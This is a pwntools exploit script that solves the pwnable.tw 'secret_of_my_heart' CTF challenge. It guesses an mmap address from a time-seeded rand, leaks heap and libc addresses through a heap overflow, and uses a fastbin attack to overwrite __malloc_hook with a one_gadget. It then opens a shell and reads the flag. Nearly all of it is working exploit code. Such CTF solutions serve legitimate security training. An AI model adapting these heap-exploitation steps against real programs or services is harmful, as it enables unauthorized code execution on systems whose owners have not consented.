from pwn import *
from ctypes import *
import os
context(os = 'linux',arch = 'i386', log_level = 'debug')
debug = 0
if debug == 1:
	p = process('./secret_of_my_heart')
	elf = ELF('./secret_of_my_heart')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	#libc_r = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
	gdb.attach(p)
	offset = 0xf02a4
else:
	p = remote('chall.pwnable.tw', 10302)
	elf = ELF('./secret_of_my_heart')
	libc = ELF('./libc_64.so.6')
	#libc_r = CDLL('./libc_64.so.6')
	offset = 0xef6c4

def add(size, name, data):
	p.recvuntil('choice :')
	p.sendline('1')
	p.recvuntil('Size of heart :')
	p.sendline(str(size))
	p.recvuntil('Name of heart :')
	p.sendline(name)
	p.recvuntil('secret of my heart :')
	p.send(data)

def show(idx):
	p.recvuntil('choice :')
	p.sendline('2')
	p.recvuntil('Index :')
	p.sendline(str(idx))

def delete(idx):
	p.recvuntil('choice :')
	p.sendline('3')
	p.recvuntil('Index :')
	p.sendline(str(idx))

def once():
	p.recvuntil('choice :')
	p.sendline('4869')

libc_r = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
#libc_r = CDLL('./libc_64.so.6')
now = libc_r.time(0)
seed = libc_r.srand(now)
mmap_addr = 0
while mmap_addr <= 0x10000:
    mmap_addr = libc_r.rand() & 0xFFFFF000
log.success('mmap_address: ' + hex(mmap_addr))

#leak heap
add(0x30, 'A' * 0x20, 'kotori')#0
show(0)
p.recvuntil('Name : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
heap_addr = u64(p.recv(6).ljust(8, '\x00')) - 0x10
log.success('heap_address: ' + hex(heap_addr))

#leak libc
add(0x18, 'kotori', 'kotori')#1
add(0x100, 'kotori', 'A' * 0xf0 + p64(0x100))#2
add(0x100, 'kotori', p64(0) + p64(0x41))#3
add(0x20, 'kotori', 'kotori')#4
delete(1)
delete(2)
add(0x18, 'kotori', 'A' * 0x18)#1
add(0xa0, 'kotori', 'kotori')#2
add(0x20, 'kotori', 'kotori')#5
add(0x10, 'kotori', 'kotori')#6
delete(2)
delete(3)
add(0xa0, 'kotori', 'kotori')#2
show(5)
p.recvuntil('Secret : ')
libc_addr = u64(p.recv(6).ljust(8, '\x00')) - 0x68 - libc.symbols['__malloc_hook']
log.success('libc_addr: ' + hex(libc_addr))
malloc_hook = libc_addr + libc.symbols['__malloc_hook']
one_gadget = libc_addr + offset

#malloc_hook printerr
delete(2)
add(0xc0, 'kotori', p64(0) * 21 + p64(0x71))#2
delete(5)
delete(2)
add(0xc0, 'kotori', p64(0) * 21 + p64(0x71) + p64(malloc_hook - 0x23))
add(0x60, 'kotori', 'kotori')
add(0x60, 'kotori', '\x00' * 0x13 + p64(one_gadget))
delete(6)
p.sendline('cat /home/secret_of_my_heart/flag')

p.interactive()
